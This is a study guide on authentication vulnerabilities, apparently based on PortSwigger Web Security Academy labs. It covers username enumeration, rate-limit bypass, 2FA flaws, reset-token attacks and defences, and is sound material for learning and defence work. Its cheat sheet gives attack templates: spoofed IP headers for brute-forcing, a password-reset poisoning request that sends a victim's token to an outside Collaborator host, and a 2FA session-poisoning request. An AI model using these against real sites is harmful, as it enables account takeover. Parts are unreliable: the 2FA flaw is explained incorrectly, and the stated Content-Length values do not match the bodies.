# PortSwigger Academy: Authentication Vulnerabilities Reference Guide

This comprehensive reference note covers the identification, exploitation, and mitigation of authentication vulnerabilities based on the PortSwigger Web Security Academy. Authentication establishes who a user is, while authorization dictates what they are allowed to do [24]. Vulnerabilities arise when flawed logic, poor session handling, or excessive trust allows attackers to bypass login forms, hijack accounts, or elevate privileges [24, 25].

---

## I. Password-Based Vulnerabilities & Exploitation

Password-based login screens represent the most common attack surface for authentication [25]. Vulnerabilities here typically stem from predictable design patterns, descriptive error messages, or a lack of defense-in-depth against automated brute-forcing [25, 26].

### 1. Username Enumeration Techniques
Username enumeration is the process of identifying valid usernames registered within an application, which drastically narrows down the search space for password guessing [26, 27].

*   **Enumeration via Distinct HTTP Responses:** Many legacy applications return specific error messages indicating whether the username or password was incorrect (e.g., "Invalid username" vs. "Incorrect password") [27, 28]. This allows attackers to systematically brute-force usernames until the error message changes.
*   **Enumeration via Subtle Response Discrepancies:** Modern applications may try to use generic error messages like "Invalid username or password," but still expose discrepancies [28]. These include:
    *   **Subtle Typos/Formatting:** Minor structural differences in the returned HTML (e.g., an extra space, slightly different CSS class, or a period missing in the error container) [28].
    *   **HTTP Response Codes:** Returning a `200 OK` response for a failed password on a valid account, but a `403 Forbidden` or `401 Unauthorized` for an invalid account.
*   **Enumeration via Response Timing:** Applications often hash passwords using computationally expensive algorithms (e.g., Argon2, bcrypt, or PBKDF2) to protect against offline cracking [28]. 
    *   If the application first checks if a username exists, and *only* computes the password hash if the user is valid, the response time will be significantly higher for valid users than for non-existent users [28].
    *   Attackers can run concurrent timing trials (measuring millisecond delays) over multiple inputs to map valid accounts [28].
*   **Enumeration via Account Locking:** If an application locks accounts after multiple failed attempts, an attacker can submit multiple guesses for a list of potential usernames [29, 30]. If the error message suddenly changes to "Account is locked" or if the response delay increases, the username is verified as valid [30].

### 2. Bypassing Rate Limits and Brute-Force Protections
When applications implement brute-force protections, developers often make flawed assumptions about the origin of the requests [29].

*   **IP-Based Rate Limiting Bypass:** Many applications block IP addresses that submit too many failed login attempts [29]. Attackers can spoof their origin IP by injecting proxy headers that upstream servers or load balancers trust [29]. These headers include:
    *   `X-Forwarded-For: <IP>` [29]
    *   `X-Host: <IP>`
    *   `X-Real-IP: <IP>`
    *   `X-Client-IP: <IP>`
    *   `X-Originating-IP: <IP>`
    *   By rotating these IP values in each request (using tools like Burp Suite's Intruder or custom scripts), attackers can bypass per-IP rate limits [29].
*   **Username Interleaving:** If rate limiting is enforced strictly *per username* (e.g., locking an account after 3 failed attempts), an attacker can interleave their attacks [29]. Instead of guessing 100 passwords for User A, they can try 1 password across 100 different users sequentially, ensuring no single account hits its lockout threshold.
*   **Multi-Credential JSON Requests:** If the application parses login requests using JSON format, developers sometimes fail to restrict the structure [29]. If the JSON parser accepts arrays, an attacker may be able to submit a single request containing multiple credential guesses:
    ```json
    {
        "username": "victim",
        "password": ["123456", "password", "qwerty", "secret"]
    }
    ```
    If the server-side authentication loop processes every password in the array within a single database transaction, the attacker can guess hundreds of passwords while registering only a single HTTP request, completely bypassing per-request rate limiters.

---

## II. Multi-Factor Authentication (MFA) Vulnerabilities

Multi-Factor Authentication (MFA) relies on verifying multiple distinct categories of credentials (knowledge, possession, inherence) [32]. However, flawed MFA implementation often leaves security backdoors [32, 33].

### 1. Two-Factor Authentication (2FA) Simple Bypass
A simple bypass occurs when an application relies solely on client-side routing to enforce 2FA [33].
*   After entering valid username/password credentials, the application redirects the user to `/login2` to enter their 2FA code [33].
*   If the backend does not enforce 2FA verification on subsequent endpoints, an attacker can skip `/login2` entirely and navigate directly to `/my-account` or `/admin` [33].

### 2. Flawed 2FA Verification Logic (Session Poisoning)
A critical flaw occurs when the application associates the 2FA state with a user session in an unsafe manner [33, 34].
*   **The Flaw:** During the first login step, the server issues a session cookie (e.g., `session=abc`) and sets a temporary parameter on the backend (or in a cookie) indicating which user's 2FA code is currently being verified (e.g., `verify_user=victim`).
*   **The Exploit:** If the attacker logs in with their own valid credentials, receives their own session, and then modifies the `verify_user` cookie or parameter to `victim`, the server will map the attacker's submitted 2FA code verification attempt to the victim's account [33, 34]. Since the attacker has access to their own 2FA generator/code, they enter their own code, which the server validates, mistakenly granting access to the victim's account.

### 3. Brute-Forcing 2FA Verification Codes
*   Applications that issue short-lived 2FA tokens (e.g., 4-digit or 6-digit PINs) must implement aggressive rate limits [34].
*   Without rate limits, there are only 10,000 (for 4-digit) or 1,000,000 (for 6-digit) combinations. An attacker can use Burp Repeater or Intruder to exhaust the entire keyspace within minutes before the token expires [34].

---

## III. Stay-Logged-In & Cookie Persistence Vulnerabilities

To provide a convenient user experience, many web applications offer a "remember me" or "stay logged in" feature [35]. These mechanisms frequently fail to utilize secure, cryptographically random session tokens [35, 36].

*   **Predictable and Static Cookie Values:** Many applications generate "stay logged in" cookies by concatenating static user parameters and encoding or hashing them [35]. Common insecure formats include:
    *   `Base64(username:password)` [35]
    *   `Base64(username:MD5(password))`
    *   `username.SHA256(secret_salt)`
*   **Brute-Forcing Stay-Logged-In Cookies:** If the cookie structure depends on a weak hash of the password (e.g., MD5), an attacker who can guess the password or has access to a password dictionary can pre-compute or brute-force the cookie value directly [35]. Once generated, the attacker submits the cookie to bypass the login portal entirely.
*   **Lack of Session Invalidation:** Insecure applications fail to invalidate persistence cookies when a user logs out [35, 36]. If an attacker intercepts a valid "stay logged in" cookie, it remains functional indefinitely, even if the victim changes their password.

---

## IV. Password Reset & Changing Vulnerabilities

Secondary authentication features like password resets and password changes are heavily targeted because they lead directly to complete account takeover [36, 38].

### 1. Password Reset Broken Logic
Password reset mechanisms that generate temporary reset tokens are often implemented with structural logic errors [37].
*   **Token-User Disconnection:** The application might send a valid reset token to the user, but during the final password update step (e.g., `POST /forgot-password?token=XYZ`), the server accepts a separate parameter (such as `username=victim`) in the request body [37].
*   **Exploitation:** If the server updates the password for whatever `username` is in the POST body without verifying that the `token` actually belongs to that user, an attacker can use their own valid reset token to reset the victim's password [37].

### 2. Password Reset Poisoning via Host Header Manipulation
Many frameworks dynamically generate password reset links using HTTP request headers to determine the domain [38].
*   **The Mechanism:** When a user requests a password reset, the backend generates an email containing a link like `https://<domain>/reset-password?token=XYZ`. To find `<domain>`, the application reads the incoming HTTP `Host` header.
*   **The Attack:** An attacker sends a password reset request for `victim` but modifies the `Host` header (or injects standard proxy headers) [38]:
    ```http
    POST /forgot-password HTTP/1.1
    Host: attacker-controlled.com
    X-Forwarded-Host: attacker-controlled.com
    ```
*   **Exfiltration:** The application generates a valid reset token but emails the victim a link pointing to `https://attacker-controlled.com/reset-password?token=XYZ` [38]. When the victim clicks the link, their browser transmits the sensitive reset token directly to the attacker's web server logs, allowing the attacker to hijack the reset flow.

### 3. Vulnerable Password-Change Operations
*   **Lack of Current Password Verification:** Password change panels must require the user's current password before allowing a new password to be set [38]. If they do not, any attacker who gains temporary local browser access or exploits a Cross-Site Request Forgery (CSRF) vulnerability can change the account password instantly.
*   **Exploitable Password Change Brute-Forcing:** Some applications rate limit the main login page but fail to rate limit the password-change endpoint [38, 39]. An attacker who has hijacked a session can brute-force other fields or execute nested attacks on secondary credentials [39].

---

## V. Secure Authentication Defense-in-Depth

Securing authentication requires a holistic defense strategy that protects every aspect of credential verification, rate limiting, and session persistence [39, 41].

```
                     [ Incoming Authentication Request ]
                                     │
                                     ▼
                     [ 1. Spoof-Resistant Rate Limiting ]
                       - Track by IP & Session ID
                       - Leverage CAPTCHAs, not just blocks
                                     │
                                     ▼
                     [ 2. Uniform Enumeration Defense ]
                       - Generic error messages
                       - Uniform response delays (constant-time)
                                     │
                                     ▼
                     [ 3. Strict Verification Logic ]
                       - Secure session isolation
                       - Cryptographically random, ephemeral tokens
```

### 1. Hardening Credentials & Identity Verification
*   **Do Not Count on Users:** Implement strong password complexity rules, compare against lists of breached passwords, and enforce mandatory MFA [40].
*   **Proper Hashing:** Securely hash and salt passwords on the server side using strong, CPU-intensive algorithms (e.g., Argon2id or bcrypt) with appropriate work factors to prevent offline cracking [28, 39].

### 2. Preventing Username Enumeration
*   **Generic Error Messages:** Always return identical, generic error messages for all failed login attempts, such as "Invalid username or password" [40].
*   **Constant-Time Verification:** Ensure the application takes the same amount of time to respond, regardless of whether the username is valid or invalid [28, 40]. If the username is invalid, the backend should still run a dummy cryptographic hashing computation to match the time spent hashing valid credentials.

### 3. Implementing Robust Brute-Force Protection
*   **IP Protection Resilience:** Do not rely solely on the `X-Forwarded-For` or other client-controlled HTTP headers for tracking rate limits [29, 40]. Validate rate limits using physical connection parameters or enforce CAPTCHAs instead of hard IP bans to keep applications accessible [40].
*   **Multi-Factor Isolation:** Ensure that 2FA state checks are strictly isolated to the specific session attempting authentication [41]. Never trust client-supplied identifiers for session mapping.

---

## VI. Authentication Bypass & Enumeration Cheat Sheet

### 1. HTTP Headers for IP Rotation (Brute-Force Bypass)
Inject these headers during Intruder/brute-force attacks to rotate the origin IP and bypass rate limits [29]:

| Header | Sample Value | Description |
| :--- | :--- | :--- |
| `X-Forwarded-For` | `1.1.1.1` | Standard proxy representation [29]. |
| `X-Real-IP` | `2.2.2.2` | Often used by NGINX/reverse proxies. |
| `X-Client-IP` | `3.3.3.3` | Used by older caching servers. |
| `X-Originating-IP` | `4.4.4.4` | Used by Microsoft ISA servers. |
| `CF-Connecting-IP` | `5.5.5.5` | Cloudflare's client IP header. |

### 2. Password Reset Poisoning Exploit Template
Modify the headers during a password reset request to exfiltrate the token to an external domain [38]:

```http
POST /password-reset?user=carlos HTTP/1.1
Host: vulnerable-site.com
X-Forwarded-Host: COLLABORATOR-SUBDOMAIN.oastify.com
X-Forwarded-Proto: https
Content-Type: application/x-www-form-urlencoded
Content-Length: 17

username=carlos
```

### 3. Multi-Factor Session Poisoning Exploit Payload
To hijack a victim's session when 2FA verification logic is flawed [33, 34]:

```http
POST /login2 HTTP/1.1
Host: vulnerable-site.com
Cookie: session=ATTACKER_AUTHENTICATED_SESSION; verify=victim
Content-Type: application/x-www-form-urlencoded
Content-Length: 22

mfa-code=ATTACKER_MFA_CODE
```
*(The server incorrectly processes `ATTACKER_MFA_CODE` against the session of `victim` due to the lack of session integrity checks) [33, 34].*
